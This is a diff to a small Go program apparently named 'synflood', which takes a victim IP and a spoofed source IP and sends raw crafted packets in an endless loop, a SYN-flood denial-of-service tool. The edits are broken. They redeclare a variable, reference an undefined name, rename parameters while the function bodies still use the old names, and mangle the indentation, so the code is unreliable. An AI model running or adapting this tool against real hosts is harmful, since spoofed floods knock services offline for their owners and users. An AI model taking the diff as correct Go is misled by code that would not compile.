@@ -14,10 +14,10 @@ import (
 	"log"
 	"math/rand"
 	"net"
+  "time"
 	"os"
 	"runtime"
 	"syscall"
-	"time"
   // import the custom google packages from their  github.
 	"github.com/google/gopacket"
 	"github.com/google/gopacket/layers"
@@ -46,7 +46,7 @@ func main() {
 		log.Fatal("[Usage]: synflood <victimIP> <spoofedIP>")
 	}
 	raddrAdress := net.ParseIP(os.Args[1]) // get the raddr address
-	addr := syscall.SockaddrInet4
+	raddrAdress := syscall.SockaddrInet4
   {
 		Port: 0,
 		Addr: to4Array(raddrAdress),
@@ -66,7 +66,7 @@ func main() {
 	}
 	for
   {
-		check(syscall.Sendto(fd, p, 0, &addr))
+		check(syscall.Sendto(fd, p, 0, &addrAdress))
 	}
 }
 
@@ -98,13 +98,13 @@ func packet(raddrAdress net.IP) []byte {
 	return buf.Bytes()
 }
 
-func to4Array(raddr net.IP) (raddrb [4]byte) {
+func to4Array(raddrAdress net.IP) (raddrb [4]byte) {
 	copy(raddrb[:], raddr.To4())
 	return
 }
 
-func check(er error) {
-	if er != nil {
+func check(err error) {
+	if err != nil {
     // there was a fatal error
 		log.Fatal(er)
 	}
